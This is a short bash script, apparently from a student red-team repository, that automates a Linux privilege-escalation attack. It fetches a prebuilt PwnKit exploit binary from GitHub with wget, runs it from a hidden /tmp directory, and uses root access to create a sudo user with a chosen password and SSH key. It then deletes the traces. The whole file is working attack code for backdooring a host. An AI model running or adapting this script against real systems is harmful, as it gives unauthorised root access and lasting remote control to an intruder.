# read flags
while getopts u:p:s: flag
do
    case "${flag}" in
        u) SSH_USERNAME=${OPTARG};;
        p) SSH_PASSWORD=${OPTARG};;
        s) SSH_KEY=${OPTARG};;
    esac
done

echo "Running Hellevator!"

ADD_USER_COMMAND="useradd -m $SSH_USERNAME -g sudo -s /bin/bash; echo '$SSH_USERNAME:$SSH_PASSWORD' | chpasswd; mkdir -p /home/$SSH_USERNAME/.ssh && touch /home/$SSH_USERNAME/.ssh/authorized_keys; echo '$SSH_KEY' > /home/$SSH_USERNAME/.ssh/authorized_keys; cat /home/$SSH_USERNAME/.ssh/authorized_keys"

echo "Exploiting PwnKit..."
mkdir -p /tmp/.lolzpwnd/$USER
cd /tmp/.lolzpwnd/$USER
wget -O pwnkit_x64 https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/exploits/pwnkit_x64
chmod +x pwnkit_x64
echo $ADD_USER_COMMAND | ./pwnkit_x64

# clean up after ourselves
rm -rf /tmp/.lolzpwnd/$USER
